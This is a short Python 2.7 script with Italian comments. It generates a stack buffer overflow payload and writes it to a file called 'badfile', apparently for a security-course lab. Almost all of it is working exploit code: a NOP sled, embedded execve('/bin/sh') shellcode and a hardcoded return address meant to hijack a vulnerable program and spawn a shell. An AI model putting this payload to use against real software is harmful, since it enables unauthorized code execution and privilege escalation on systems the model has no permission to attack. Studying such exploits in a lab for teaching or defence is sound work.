# NOTE: for python 2.7

import os
import struct

#shellcode solito
shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

buffer = 0xbffff250 #punto di partenza (quello minimo)
#piu` o meno quanto sara` il mio offset -> approssimazione della lunghezza dell'injection vector mentre la tolleranza viene data dalla nopsled (il nopsled ci permette di avere una tolleranza sull'indirizzo del buffer, senza di quello dovremmo saperlo con esattezza)
offset = 110

#buffer overflow -> di solito erano shellcode+padding+ret, adesso cambia
#[nopsled + shellcode + nopsled][ret]
#nopsled + shellcode + nopsledf = 108
# nopsled = 108 - len(shellcode) -20

retaddr = buffer - offset
nopsled = 108 - len(shellcode) -30 #30 e` la working area

payload = "\x90"*nopsled
payload += shellcode
payload += "\x90"*30
payload += struct.pack("I", retaddr)

f = open("badfile", "w")
f.write("%s" %payload)
f.close()


